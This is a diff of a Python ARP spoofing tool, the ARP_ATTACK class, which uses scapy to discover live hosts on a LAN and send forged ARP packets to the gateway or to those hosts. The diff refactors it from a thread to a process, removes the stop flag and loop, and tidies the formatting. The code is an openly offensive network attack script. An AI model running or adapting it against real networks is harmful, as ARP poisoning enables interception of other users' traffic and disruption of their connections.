@@ -9,10 +9,10 @@ import socket
 import fcntl
 import struct
 import time
-from threading import Thread
+from multiprocessing import Process
 
 
-class ARP_ATTACK(Thread):
+class ARP_ATTACK(Process):
 
     """@author:DrWrong
        email: yuhangchaney@gmail.com
@@ -38,7 +38,7 @@ class ARP_ATTACK(Thread):
                         target_host --the target ips and macs to send packet to,
                                                 if don't provide, and attact_type is 0
                                                 then target_host will set to the geteway
-                                                ip address 
+                                                ip address
                                                 if attact_type is 1 then target_host will
                                                 set to the alive ips in the same LAN
                         ifname      -- the interface used to send packet with,
@@ -58,6 +58,7 @@ class ARP_ATTACK(Thread):
                  sleeptime=0,
                  timeout=5,
                  *arg, **kwargs):
+        ''' init '''
         super(ARP_ATTACK, self).__init__(*arg, **kwargs)
         self.arp_ip = arp_ip
         self.arp_mac = arp_mac
@@ -81,7 +82,6 @@ class ARP_ATTACK(Thread):
 
         if not self.arp_mac:
             self.arp_mac = self.get_hw_address()
-        self.attack = True
         self.daemon = True
 
     def get_gateway_ip(self):
@@ -96,7 +96,8 @@ class ARP_ATTACK(Thread):
     def get_host(self):
         hostip = self.get_ipaddress()
         mask = str(self.get_netmask())
-        res = arping(hostip + '/' + mask,timeout=self.timeout,iface=self.ifname)
+        res = arping(
+            hostip + '/' + mask, timeout=self.timeout, iface=self.ifname)
         hostlist = {}
         for eachenty in res[0].res:
             ip = eachenty[0].pdst
@@ -147,15 +148,13 @@ class ARP_ATTACK(Thread):
         send(t, iface=self.ifname)
 
     def run(self):
-        while(self.attack):
-            for arp_ip in self.arp_ip:
-                for dstip, dsthw in self.target_host.iteritems():
-                    self.arp_hack(arp_ip, dsthw, dstip)
-                    time.sleep(self.sleeptime)
-            time.sleep(self.sleeptime)
 
-    def stop(self):
-        self.attack = False
+        for arp_ip in self.arp_ip:
+            for dstip, dsthw in self.target_host.iteritems():
+                self.arp_hack(arp_ip, dsthw, dstip)
+                time.sleep(self.sleeptime)
+        time.sleep(self.sleeptime)
+
 
 if __name__ == '__main__':
     attack = ARP_ATTACK(ifname='wlan0')
